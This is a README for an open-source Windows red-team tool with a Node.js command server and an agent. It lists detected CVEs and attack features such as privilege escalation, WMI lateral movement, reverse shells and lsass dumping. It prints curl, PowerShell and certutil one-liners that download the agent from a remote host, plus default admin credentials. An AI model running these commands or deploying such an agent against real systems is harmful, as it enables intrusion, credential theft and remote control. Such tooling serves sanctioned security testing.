[![GPLv3 license](https://img.shields.io/badge/License-GPLv3-blue.svg)](http://perso.crans.org/besson/LICENSE.html)
[<img src="https://img.shields.io/badge/join-telegram-blue">](https://t.me/join0xsp)
[<img src="https://img.shields.io/badge/build%20with-Lazarus-red.svg">](https://www.lazarus-ide.org/)
[<img align="right" src="https://github.com/lawrenceamer/0xsp-Mongoose/blob/0xsp-red/lg.png?raw=true" height="512" width="400">]()
[<img src="https://img.shields.io/badge/join-discord-orange">](https://discord.gg/Xsdxxkm)
<img src="https://img.shields.io/twitter/follow/zux0x3a?label=follow&style=social">

# 0xsp Mongoose Red for Winodws 

0xsp mongoose red version is provided to assist your needs during cyber security simulation, by using this version you will be able to audit a targeted windows operation system 
for system vulnerabilities, misconfigurations and privilege escalation attacks and replicate the tactics and techniques of an advanced adversary in a network.

with node js support for web application API, it becomes much easier for installation and customization in timely manner, the windows sensor agent will communicate with application API to transfer results, and receive commands as bidirectional technique. 

the agent is able to identify and detect windows exploits by using `windows update api` and `exploit database definitions` modules, the new release will detect also the following 
vulnerabilities.
 
* CVE-2019-0836
* CVE-2019-0841
* CVE-2019-1064
* CVE-2019-1130
* CVE-2019-1253
* CVE-2019-1385
* CVE-2019-1388
* CVE-2019-1405
* CVE-2019-1315
* CVE-2020-0787
* CVE-2020-0796
* CVE-2020-0797 

## Features 

* Windows Privilege escalation scanning techniques. 
* web application built with NodeJS 
* supports sqlite DB 
* Lateral movements techniques. [ video](https://www.youtube.com/watch?v=pEpiOrpyYs8)
* Bidirectional communication channel.[ video ](https://www.youtube.com/watch?v=tyhBuWCB_aY)
* Plugins online packaging.  
* Enhanced exploit detecter scripting engine. 
* weaponization of run-as-user windows api function. [Video](https://youtu.be/oe-BFZpV8nw)
* local network scanning and shares enumeration.
* lsass memory dummping technique (plugin).

### installation 

```
git clone --single-branch --branch 0xsp-red https://github.com/lawrenceamer/0xsp-mongoose 
cd 0xsp-mongoose/ 
npm install 
node index.js
```
default access credentials :
* username : admin 
* password : 0xsp

[<img align="right" src="https://i.imgur.com/EQOsiv8.png">]()



### quick deploy of agent 

```
#example 1 
curl.exe -o agent.exe http://nodejsip:4000/release/x64.exe
#example 2 
powershell.exe -command (new-object net.webclient).downloadfile('http://nodejsip:4000/release/x64.exe','c:\tmp\agent.exe');
#example 3 
certutil.exe -urlcache -split -f "http://nodejsip:4000/release/x64.exe" agent.exe

```


### Usage 
```
-s --retrieve windows services and installed drivers.
-u --retrieve information about Users, groups, roles.
-c --search for senstive config files by extension.
-n --retrieve network information,network interfaces, connection details.
-w --enumerate for writeable directories, access permission Check, modified permissions.
-i --enumerate windows system information, Sessions, log information.
-l --search in any file for specific string , ex : agent.exe -l c:\ password *.config.
-o --specify host address of nodejs application.
-p --enumerate installed Softwares, Running Processes, Tasks .
-e --kernel inspection Tool, it will help to search through tool databases for windows kernel vulnerabilities
-x --password to authorize your connection with node js application.
-d --download Files directly into Target Machine .
-t --upload Files From target machine into node js application.
-m --run all known scan Types together .

-r --spawn a reverse shell with specific account(weaponization of run-as-user windows api function).
-lr --Lateral movement technique using WMI (e.g -lr -host 192.168.14.1 -username administrator -password blabla -srvhost nodejsip )
-nds --network discovery and share enumeration
-cmd --transfer commands via HTTP Shell
-interactive --starting interactive mode (eg : loading plugins ..etc)
-username --identity authentication for specific attack modules.
-password --identity authentication for specific attack modules.
-host --identify remote host to conduct an attack to.
-srvhost --set rhost of node js application.(bidirectional communications).
```
### quick wiki 
https://github.com/lawrenceamer/0xsp-Mongoose/wiki/0xsp-mongoose-red-version-2.1

### detailed research site 
https://0xsp.com 

### contribution 
the project is opensourced and has been built with Lazarus IDE, you are welcomed to suggest any ideas or reporting bugs 

### tool tutorials 
make sure to subscribe into the following channel to be notified when new tutorial and tricks published for 0xsp 
https://www.youtube.com/channel/UCoEr6Qsyd6oMsPmaJPQ_FOg

